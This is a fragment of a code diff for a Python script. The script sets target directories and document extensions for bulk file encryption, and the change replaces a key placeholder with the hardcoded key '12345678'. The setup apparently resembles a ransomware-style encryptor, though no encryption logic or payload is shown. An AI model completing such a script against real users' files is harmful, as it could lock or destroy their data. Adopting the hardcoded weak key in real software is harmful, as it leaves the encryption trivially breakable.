@@ -2,7 +2,7 @@ import os
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 
-encryption_key = b'your_encryption_key'
+encryption_key = b'12345678'
 
 target_directories = ['/path/to/directory1', '/path/to/directory2']
 target_extensions = ['.txt', '.docx']
